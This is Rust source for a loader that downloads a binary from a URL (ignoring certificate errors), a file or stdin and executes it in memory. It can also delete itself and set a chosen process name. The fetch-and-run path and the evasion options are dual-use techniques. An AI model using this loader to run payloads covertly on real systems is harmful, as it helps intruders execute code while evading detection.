// #![windows_subsystem = "windows"]

use std::env;
use std::fs::read;
use std::io::Write;
use std::path::PathBuf;
use std::process::exit;
use std::io::{self, Read};

use reqwest::blocking::{Client, RequestBuilder};


const ULEXEC_NAME: &str = env!("CARGO_PKG_NAME");


#[derive(Debug)]
struct Args {
    url: Option<String>,
    file: Option<String>,
    post: bool,
    stdin: bool,
    #[cfg(target_os = "linux")]
    reexec: bool,
    #[cfg(target_os = "linux")]
    mfdexec: bool,
    #[cfg(target_os = "linux")]
    remove: bool,
    #[cfg(target_os = "linux")]
    name: Option<String>,
    exec_args: Vec<String>,
}

impl Args {
    fn new() -> Self {
        Args {
            url: None,
            file: None,
            post: false,
            stdin: false,
            #[cfg(target_os = "linux")]
            reexec: false,
            #[cfg(target_os = "linux")]
            mfdexec: false,
            #[cfg(target_os = "linux")]
            remove: false,
            #[cfg(target_os = "linux")]
            name: None,
            exec_args: Vec::new(),
        }
    }
}

fn get_env_var(var: &str) -> String {
    env::var(var).unwrap_or("".into())
}

fn unset_env_vars_with_prefix(prefix: &str) {
    for (key, _) in env::vars() {
        if key.starts_with(prefix) {
            env::remove_var(key);
        }
    }
}

fn parse_args() -> Args {
    let env_args: Vec<String> = env::args().skip(1).collect();
    let mut args = Args::new();

    let mut i = 0;
    while i < env_args.len() {
        match env_args[i].as_str() {
            "~~url" | "~~u" => {
                if i + 1 < env_args.len() {
                    args.url = Some(env_args[i + 1].to_string());
                    i += 2
                } else {
                    eprintln!("A value is required for '~~url <URL>' but none was supplied!");
                    exit(1)
                }
            }
            "~~file" | "~~f" => {
                if i + 1 < env_args.len() {
                    args.file = Some(env_args[i + 1].to_string());
                    i += 2
                } else {
                    eprintln!("A value is required for '~~file <PATH>' but none was supplied!");
                    exit(1)
                }
            }
            #[cfg(target_os = "linux")]
            "~~name" | "~~n" => {
                if i + 1 < env_args.len() {
                    args.name = Some(env_args[i + 1].to_string());
                    i += 2
                } else {
                    eprintln!("A value is required for '~~name <NAME>' but none was supplied!");
                    exit(1)
                }
            }
            "~~post" | "~~p" => {
                args.post = true;
                i += 1
            }
            "~~stdin" | "~~s" => {
                args.stdin = true;
                i += 1
            }
            #[cfg(target_os = "linux")]
            "~~remove" | "~~r" => {
                args.remove = true;
                i += 1
            }
            #[cfg(target_os = "linux")]
            "~~reexec" | "~~re" => {
                args.reexec = true;
                i += 1
            }
            #[cfg(target_os = "linux")]
            "~~mfdexec" | "~~m" => {
                args.mfdexec = true;
                i += 1
            }
            "~~version" | "~~v" => {
                println!("{ULEXEC_NAME} v{}", env!("CARGO_PKG_VERSION"));
                exit(0)
            }
            "~~help" | "~~h" => {
                print_usage();
                exit(0)
            }
            arg => {
                args.exec_args.push(arg.to_string());
                i += 1
            }
        }
    }
    if args.url.is_none() {
        let var = get_env_var("ULEXEC_URL");
        if !var.is_empty() {
            args.url = Some(var)
        } else if !args.exec_args.is_empty() {
            let arg = &args.exec_args[0];
            if arg.starts_with("http://") || arg.starts_with("https://") {
                args.url = Some(args.exec_args.remove(0));
            }
        }
    }
    if args.file.is_none() {
        let var = get_env_var("ULEXEC_FILE");
        if !var.is_empty() { args.file = Some(var) }
    }
    if !args.post {
        args.post = get_env_var("ULEXEC_POST") == "1"
    }
    if !args.stdin {
        args.stdin = get_env_var("ULEXEC_STDIN") == "1"
    }
    #[cfg(target_os = "linux")]
    {
        if args.name.is_none() {
            let var = get_env_var("ULEXEC_NAME");
            if !var.is_empty() {
                args.name = Some(var)
            } else {
                args.name = Some(ULEXEC_NAME.into())
            }
        }
        if !args.remove {
            args.remove = get_env_var("ULEXEC_REMOVE") == "1"
        }
        if !args.reexec {
            args.reexec = get_env_var("ULEXEC_REEXEC") == "1"
        }
        if !args.mfdexec {
            args.mfdexec = get_env_var("ULEXEC_MFDEXEC") == "1"
        }
    }
    args
}

fn print_usage() {
    println!("{}\n", env!("CARGO_PKG_DESCRIPTION"));
    println!("Usage: {ULEXEC_NAME} [OPTIONS] [EXEC ARGS]...\n");
    println!("Arguments:");
    println!("  [EXEC ARGS]...  Command line arguments for execution\n");
    println!("Options:");
    println!("  ~~u,  ~~url <URL>    Load the binary file from URL (env: ULEXEC_URL)");
    println!("  ~~p,  ~~post         Use the POST method instead of GET (env: ULEXEC_POST)");
    println!("  ~~f,  ~~file <PATH>  Path to the binary file for exec (env: ULEXEC_FILE)");
    println!("  ~~s,  ~~stdin        Load the binary file from stdin (env: ULEXEC_STDIN)");
    #[cfg(target_os = "linux")]
    {
    println!("  ~~r,  ~~remove       Self remove (env: ULEXEC_REMOVE)");
    println!("  ~~re, ~~reexec       Reexec fix (env: ULEXEC_REEXEC)");
    println!("  ~~m,  ~~mfdexec      Force use memfd exec (env: ULEXEC_MFDEXEC)");
    println!("  ~~n,  ~~name         Set process name or cmdline for memfd exec (env: ULEXEC_NAME)");
    }
    println!("  ~~v,  ~~version      Print version");
    println!("  ~~h,  ~~help         Print help");
}

fn main() {
    let mut args: Args;

    let is_child = get_env_var("ULEXEC_CHILD") == "1";

    #[cfg(target_os = "windows")]
    {
        if is_child {
            args = Args::new();
            args.stdin = true;
            args.exec_args = env::args().skip(1).collect();
        } else {
            args = parse_args()
        }
    }

    #[cfg(target_os = "linux")]
    {
        args = parse_args();
        if args.remove {
            let _ = std::fs::remove_file(env::current_exe().unwrap());
        }
    }

    unset_env_vars_with_prefix("ULEXEC_");

    let mut exec_file: Vec<u8> = Vec::new();
    let mut file_path = PathBuf::new();

    if args.stdin {
        if let Err(err) = io::stdin().lock().read_to_end(&mut exec_file) {
            eprintln!("Failed to read from stdin: {err}");
            exit(1)
        }
    } else if args.file.is_some() {
        file_path = PathBuf::from(args.file.unwrap());
    } else if args.url.is_some() {
        let client = Client::builder();

        #[cfg(target_os = "windows")]
        let client = client.use_rustls_tls();

        let client = client
            .danger_accept_invalid_certs(true)
            .timeout(None)
            .build()
            .unwrap();

        let url = args.url.as_ref().unwrap();
        let req: RequestBuilder = if args.post {
            client.post(url)
        } else {
            client.get(url)
        };
        match req.send() {
            Ok(data) => {
                exec_file = data.bytes().unwrap().to_vec()
            }
            Err(err) => {
                eprintln!("{err}");
                exit(1)
            }
        }
        drop(client)
    } else if !args.exec_args.is_empty() {
        file_path = PathBuf::from(args.exec_args.remove(0))
    } else {
        eprintln!("Specify the path to the binary file or see '{ULEXEC_NAME} ~~help'");
        exit(1)
    }

    if !file_path.to_str().unwrap().is_empty() && exec_file.is_empty() {
        match read(&file_path) {
            Ok(data) => {
                exec_file = data
            }
            Err(err) => {
                eprintln!("Failed to read the binary file: {err}: {:?}", file_path);
                exit(1)
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        use std::process::{Stdio, Command};

        if !is_child && (!exec_file.is_empty() || args.stdin) {
            env::set_var("ULEXEC_CHILD", "1");
            let mut child = Command::new(env::current_exe().unwrap())
                .args(args.exec_args)
                .envs(env::vars())
                .stdin(Stdio::piped())
                .stdout(io::stdout())
                .stderr(io::stderr())
                .spawn().unwrap();

            let mut exec_stdin = child.stdin.as_ref().unwrap();
            exec_stdin.write_all(&exec_file).unwrap();
            drop(exec_file);

            exit(child.wait().unwrap().code().unwrap())
        } else {
            unsafe { memexec::memexec_exe(&exec_file).unwrap() }
        }
    }

    #[cfg(target_os = "linux")]
    {
        use std::time;
        use std::ffi::CString;
        use std::os::fd::AsRawFd;
        use std::thread::{spawn, sleep};
        use std::fs::{File, read_to_string};

        use std::os::raw::c_char;
        use nix::sys::stat::Mode;
        use nix::libc::{prctl, PR_SET_NAME};
        use goblin::elf::{Elf, program_header};
        use nix::unistd::{write, close, mkfifo};
        use memfd_exec::{Stdio, MemFdExecutable};
        use nix::sys::memfd::{memfd_create, MemFdCreateFlag};


        fn is_pie(bytes: &[u8]) -> bool {
            match Elf::parse(bytes) {
                Ok(elf) => {
                    elf.program_headers.iter()
                    .find(|h| h.p_type == program_header::PT_LOAD)
                    .unwrap()
                    .p_vaddr == 0
                }
                Err(err) => {
                    eprintln!("Failed to parse ELF: {err}");
                    exit(1)
                }
            }
        }

        fn random_string(length: usize) -> String {
            const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let mut rng = time::SystemTime::now().duration_since(time::UNIX_EPOCH).unwrap().as_secs();
            let mut result = String::with_capacity(length);
            for _ in 0..length {
                rng = rng.wrapping_mul(48271).wrapping_rem(0x7FFFFFFF);
                let idx = (rng % CHARSET.len() as u64) as usize;
                result.push(CHARSET[idx] as char);
            }
            result
        }

        fn ul_exec(file_path: PathBuf, exec_args: Vec<String>) {
            let mut args_cstrs: Vec<CString> = exec_args.iter()
                .map(|arg|
                    CString::new(arg.clone()).unwrap()
            ).collect();

            let file_cstr = CString::new(
                file_path.to_str().unwrap()
            ).unwrap();
            args_cstrs.insert(0, file_cstr);

            let envs: Vec<CString> = env::vars()
                .map(|(key, value)|
                    CString::new(format!("{}={}", key, value)).unwrap()
            ).collect();

            userland_execve::exec(
                &file_path,
                &args_cstrs,
                &envs,
            )
        }

        if args.reexec && !is_child && !args.mfdexec {
            let fifo_path = env::temp_dir().join(random_string(8));
            if let Err(err) = mkfifo(&fifo_path, Mode::S_IRWXU) {
                eprintln!("Failed to create fifo: {err}: {:?}", fifo_path);
                exit(1)
            }
            env::set_var("ULEXEC_CHILD", "1");
            env::set_var("ULEXEC_REEXEC", "1");
            env::set_var("ULEXEC_FILE", &fifo_path);
            let fifo_path = fifo_path.clone();
            let exec_file = exec_file.clone();
            spawn(move || {
                match File::create(&fifo_path) {
                    Ok(mut fifo) => {
                        if let Err(err) = fifo.write_all(&exec_file) {
                            eprintln!("Failed to write the binary file to fifo: {err}: {:?}", fifo_path);
                            exit(1)
                        }
                        let _ = std::fs::remove_file(&fifo_path);
                    }
                    Err(err) => {
                        eprintln!("Failed to open fifo: {err}: {:?}", fifo_path);
                        exit(1)
                    }
                }
            });
        }

        let exec_name = args.name.unwrap();

        if args.mfdexec || !is_pie(&exec_file) {
            drop(file_path);

            let noexec_path = PathBuf::from("/proc/sys/vm/memfd_noexec");
            if noexec_path.exists() {
                match read_to_string(&noexec_path) {
                    Ok(data) => {
                        if !data.contains("0") {
                            eprint!("You need to enable memfd_noexec == 0: {:?} == {data}", &noexec_path);
                            exit(1)
                        }
                    }
                    Err(err) => {
                        eprintln!("Failed to read memfd_noexec: {err}: {:?}", &noexec_path);
                        exit(1)
                    }
                }
            }
            drop(noexec_path);

            MemFdExecutable::new(exec_name, &exec_file)
                .args(args.exec_args)
                .envs(env::vars())
                .exec(Stdio::inherit());
        } else {
            if exec_name != ULEXEC_NAME {
                let exec_name_cstr = CString::new(exec_name.clone()).unwrap();
                unsafe {
                    prctl(PR_SET_NAME, exec_name_cstr.as_ptr() as *mut c_char, 0, 0, 0);
                }
            }

            if !file_path.exists() && !exec_file.is_empty() {
                match &memfd_create(
                    CString::new(exec_name).unwrap().as_c_str(),
                    MemFdCreateFlag::MFD_CLOEXEC
                ) {
                    Ok(memfd) => {
                        let memfd_raw = memfd.as_raw_fd();

                        file_path = PathBuf::from(
                            format!("/proc/self/fd/{memfd_raw}")
                        );

                        if let Err(err) = write(memfd, &exec_file) {
                            eprintln!("Failed to write the binary file to memfd: {err}: {:?}", file_path);
                            exit(1)
                        }
                        drop(exec_file);

                        spawn(move || {
                            sleep(time::Duration::from_millis(1));
                            close(memfd_raw).unwrap()
                        });

                        ul_exec(file_path, args.exec_args)
                    }
                    Err(err) => {
                        eprintln!("Failed to create memfd: {err}");
                        exit(1)
                    }
                }
            } else {
                drop(exec_file);
                ul_exec(file_path, args.exec_args)
            }
        }
    }
}
